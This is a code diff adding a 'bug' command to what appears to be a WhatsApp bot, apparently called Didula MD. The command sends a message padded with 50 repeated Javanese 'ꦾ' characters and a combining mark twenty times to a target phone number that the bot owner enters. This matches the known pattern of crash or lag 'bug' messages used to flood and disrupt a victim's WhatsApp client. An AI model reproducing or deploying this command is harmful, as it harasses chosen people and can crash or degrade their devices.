@@ -29,7 +29,30 @@ const os = require("os")
 
 
 
+cmd({
+    pattern: "bug",
+    desc: "Send a message 20 times to a target number.",
+    category: "main",
+    filename: __filename
+}, async (conn, mek, m, { from, args, reply, isOwner }) => {
+    if (!isOwner) return reply("❌ You are not the owner!");
 
+    const targetNumber = args[0];
+    if (!targetNumber) return reply("❗ Please provide a target number.");
+
+    const message = `̿Didula MD` + "ꦾ".repeat(50);
+    const fullMessage = message + "\n"; // Adding new line for better readability
+
+    try {
+        for (let i = 0; i < 20; i++) {
+            await conn.sendMessage(targetNumber + "@s.whatsapp.net", { text: fullMessage });
+        }
+        reply("✅ Message sent 20 times to " + targetNumber);
+    } catch (error) {
+        console.error("Failed to send message:", error);
+        reply("❗ An error occurred while sending the message.");
+    }
+});
 
 
 
